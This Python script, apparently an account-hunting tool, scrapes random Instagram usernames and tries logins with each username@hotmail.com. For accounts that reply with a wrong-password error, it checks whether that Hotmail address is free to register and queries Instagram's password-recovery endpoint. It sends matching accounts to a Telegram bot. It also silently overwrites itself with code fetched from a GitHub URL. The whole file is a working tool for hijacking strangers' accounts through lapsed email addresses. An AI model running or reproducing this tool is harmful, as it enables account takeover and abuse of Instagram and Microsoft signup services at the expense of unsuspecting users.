import requests, os, sys

# رابط الملف من GitHub (Raw)
UPDATE_URL = "https://raw.githubusercontent.com/hussainalgoker-alt/B7H/main/B7HRM.PY"
LOCAL_FILE = sys.argv[0]

def check_update():
    try:
        print("🔄 فحص التحديثات...")
        online_code = requests.get(UPDATE_URL).text

        with open(LOCAL_FILE, "r", encoding="utf-8") as f:
            local_code = f.read()

        if online_code.strip() != local_code.strip():
            print("✨ يوجد تحديث جديد! يتم التحديث الآن...")
            with open(LOCAL_FILE, "w", encoding="utf-8") as f:
                f.write(online_code)
            print("✅ تم تحديث الأداة بنجاح! أعد تشغيلها الآن.")
            sys.exit()
        else:
            print("✅ الأداة محدثة لآخر إصدار.")
    except Exception as e:
        print("⚠️ لم يتمكن من فحص التحديث:", e)

check_update()
import webbrowser
webbrowser.open('https://t.me/J9J9J2')
import os
try:
  from user_agent import generate_user_agent
  from random import choice, randrange
  from OneClick import Hunter as ig
  import requests
  from sys import stdout
  from hashlib import md5
  import secrets
  import threading
  import uuid
  import time
  import re
  import sys
  from uuid import uuid4
  from time import sleep
  from concurrent.futures import ThreadPoolExecutor
  from ms4 import UserAgentGenerator
  import string
  import random
  import json
  from os import system
except ImportError:
  os.system('pip install string')
  os.system('pip install ms4')
  os.system('pip install secrets')
  os.system('pip install OneClick')
  os.system('pip install hashlib')
  os.system('pip install uuid')
  os.system('pip install random')
  os.system('clear')
  
#— — — - - - - - - -— — - - - — - - - - - - -— - - — — —
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
#— — — - - - - - - -— — - - - — - - - - - - -— - - — — —
ses = requests.Session()
bad_em=0
good=0
bad_ig=0
#— — — - - - - - - -— — - - - — - - - - - - -— - - — — —
token = input("Bot token :")
ID= input("Chat id")
os.system('clear')
#— — — - - - - - - -— — - - - — - - - - - - -— - - — — —
while True:
        try:
            res = requests.get('https://signup.live.com/signup')
            amsc=(res.cookies.get_dict().get('amsc'))
            match=(re.search(r'"apiCanary":"(.*?)"', res.text).group(1))
            if match:canary=match.encode().decode('unicode_escape')
            break
        except:pass
        
def hotmail(email):
    global good, bad_em
    try:
          response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames',cookies= { 'amsc': amsc}, headers={
                'canary': canary,
               'origin': 'https://signup.live.com',
              'referer': 'https://signup.live.com/',
            'user-agent': str(generate_user_agent()),
          },json={
           'signInName': email
      }).text
          #print(response)
          if '"isAvailable":true' in response:
              good+=1
              tlg(email)
              sys.stdout.write(f"\r    {green}Hits : {good} {red}Bad_Insta : {bad_ig} {yellow}Bad_Email : {bad_em}    \r")
          else:
              bad_em+=1
              sys.stdout.write(f"\r    {green}Hits : {good} {red}Bad_Insta : {bad_ig} {yellow}Bad_Email : {bad_em}    \r")
    except Exception as e:''#print(e)
        
        
def insta(email):
    global bad_ig
    try:
        url = "https://b.i.instagram.com/api/v1/accounts/login/"
        headers = {
        'User-Agent': "Instagram 136.0.0.34.124 Android (26/8.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 208061712)"
      }		    	
        data = {
        'uuid':uuid.uuid4(), 
        'password':email.split('@')[0], 
        'username':email,  
        'device_id':uuid.uuid4(),  
        'from_reg':'false',  
        '_csrftoken':'missing',  
        'login_attempt_countn':'0'
      }
		
        res = requests.post(url, headers=headers, data=data).text
        #print(res)
        if "bad_password" in res:
            hotmail(email)
        else:
            bad_ig+=1
            sys.stdout.write(f"\r    {green}Hits : {good} {red}Bad_Insta : {bad_ig} {yellow}Bad_Email : {bad_em}    \r")
            sys.stdout.flush()
       #print(res.text)
    except Exception as e:''#print(e)
    
def rest(user):
    he1 = {
                    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                    'X-Pigeon-Rawclienttime': '1700251574.982',
                    'X-IG-Connection-Speed': '-1kbps',
                    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                    'X-IG-Bandwidth-TotalBytes-B': '0',
                    'X-IG-Bandwidth-TotalTime-MS': '0',
                    'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
                    'X-IG-Connection-Type': 'WIFI',
                    'X-IG-Capabilities': '3brTvw==',
                    'X-IG-App-ID': '567067343352427',
                    'User-Agent': ig.Services(),
                    'Accept-Language': 'en-GB, en-US',
                    'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Accept-Encoding': 'gzip, deflate',
                    'Host': 'i.instagram.com',
                    'X-FB-HTTP-Engine': 'Liger',
                    'Connection': 'keep-alive',
                    'Content-Length': '356',
                }
    data = {
                    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
                    'ig_sig_key_version': '4',
                }     
    reso = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=he1,data=data).json()
    if 'email' in reso:
          return reso['email']
    else:None
      
def data_id(id):
	try:
			if int(id) >1 and int(id)<1279000:
						return 2010
			elif int(id)>1279001 and int(id)<17750000:
						return 2011
			elif int(id) > 17750001 and int(id)<279760000:
						return 2012
			elif int(id)>279760001 and int(id)<900990000:
						return 2013
			elif int(id)>900990001 and int(id)< 1629010000:
						return 2014
			elif int(id)>1900000000 and int(id)<2500000000:
						return 2015
			elif int(id)>2500000000 and int(id)<3713668786:
						return 2016
			elif int(id)>3713668786 and int(id)<5699785217:
						return 2017
			elif int(id)>5699785217 and int(id)<8507940634:
						return 2018
			elif int(id)>8507940634 and int(id)<21254029834:
						return 2019
			else:
				return "2020-2023"
	except BaseException as L7N:
					return 'L7N'					            
def tlg(email):
  try:
    user=email.split('@')[0]
    res = rest(user)
    rr = res.split('@')[0]
    if user[0] == rr[0] and user[-1] == rr[-1]:
        ff = f'''
══════════════════
REST GOOD ✅
USERNAME : {user}
EMAIL : {email}
REST : {res}
URL : https://instagram.com/{user}
BY : https://t.me/J9J9J2 
══════════════════
'''
        print(ff)
        requests.post("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+ID+"&text="+str(ff))
        open('hits.txt', 'a').write(f'{ff}\n')
    else:
        error = f'''
══════════════════
REST BAD ❌
USERNAME : {user}
EMAIL : {email}
REST : {res}
URL : https://instagram.com/{user}
BY 
══════════════════
'''
        requests.post("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+ID+"&text="+str(error))
        open('hits.txt', 'a').write(f'{error}\n')
        print(error)                  
  except Exception as e:''
    #print(e)

        
def gen_users():
        list = []
        while True:
            try:
                LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                bol = json.dumps({"id": str(random.randrange(1000,900990000)), "render_surface": "PROFILE"})
                response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD, 'User-Agent': str(UserAgentGenerator),}, data = {"lsd": LsD, "variables": bol, "doc_id": "25618261841150840"})
                res = response.json()
                for user in res:
                    user = res['data']['user']['username']
                    if user not in list:
                          email=user+"@hotmail.com"
                          insta(email)
                          list.append(user)
                          
            except Exception as e:''#print(e)
                
    
with ThreadPoolExecutor(max_workers=100) as Ee:
    for i in range(100):
        Ee.submit(gen_users)
